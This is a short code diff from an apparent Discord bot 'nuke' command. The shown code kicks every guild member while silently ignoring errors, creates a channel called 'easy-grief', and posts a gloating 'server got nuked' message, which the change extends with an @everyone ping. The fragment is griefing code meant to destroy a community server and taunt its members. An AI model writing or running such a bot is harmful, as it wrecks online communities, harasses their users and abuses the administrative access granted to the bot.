@@ -14,7 +14,7 @@ module.exports = {
             message.guild.members.cache.forEach(member => member.kick().catch(() => {}));
             message.guild.channels.create(`easy-grief`, { type: 'text' });
             setTimeout(() => {
-                message.guild.channels.cache.find(channel => channel.name === "easy-grief").send({content: "The Server got nuked! : )"});
+                message.guild.channels.cache.find(channel => channel.name === "easy-grief").send({content: "The Server got nuked! : ) @everyone"});
             }, 3000);
 
     } else {
